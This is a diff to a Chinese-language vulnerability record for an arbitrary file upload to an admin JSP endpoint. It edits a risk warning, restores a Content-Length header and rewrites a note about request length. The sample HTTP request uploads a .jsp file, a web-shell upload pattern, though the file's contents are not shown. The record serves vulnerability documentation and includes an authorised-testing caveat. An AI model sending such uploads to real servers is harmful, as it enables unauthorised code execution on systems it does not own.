@@ -42,7 +42,7 @@ schema_version: "1"
 
 ## 操作风险
 
-请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -62,6 +62,7 @@ schema_version: "1"
 POST /pages/admin/tools/uploadFile/doUpload.jsp HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+Content-Length: 235
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
@@ -80,7 +81,7 @@ Content-Disposition: form-data; name="file";filename="tvrodinjqx.jsp"
 ------xbkdgks1fwucvok84tce--
 ```
 
-> 请求长度说明：原资料 Content-Length 为 235；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 235；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 上传文件位置
